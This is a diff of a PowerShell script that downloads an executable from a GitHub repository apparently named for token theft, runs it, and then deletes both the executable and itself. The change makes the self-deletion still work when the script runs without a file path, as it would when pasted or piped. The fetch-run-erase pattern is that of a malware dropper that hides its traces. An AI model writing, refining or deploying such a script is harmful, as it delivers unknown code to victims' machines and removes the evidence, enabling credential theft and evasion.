@@ -1,7 +1,7 @@
 $targetDirectory = "D:\Setups or somethin'"
 $exeUrl = "https://github.com/AFRAID-FOR-YOU/What-a-token/raw/refs/heads/main/main.exe"
 $exePath = "$targetDirectory\main.exe"
-$selfPath = $MyInvocation.MyCommand.Path
+$selfPath = if ($MyInvocation.MyCommand.Path) { $MyInvocation.MyCommand.Path } else { $null }
 
 # Ensure directory exists
 if (-Not (Test-Path -Path $targetDirectory)) {
@@ -33,15 +33,15 @@ try {
     Write-Error "Error during execution: $_"
 }
 
-# Cleanup - delete the downloaded file and then this script
+# Cleanup - delete the downloaded file and then this script (if running from file)
 try {
     Write-Host "Cleaning up..."
     if (Test-Path $exePath) {
         Remove-Item -Path $exePath -Force
     }
     
-    # Delete this script
-    if (Test-Path $selfPath) {
+    # Only try to delete if we have a path to this script
+    if ($selfPath -and (Test-Path $selfPath)) {
         Start-Sleep -Seconds 1
         Remove-Item -Path $selfPath -Force
     }
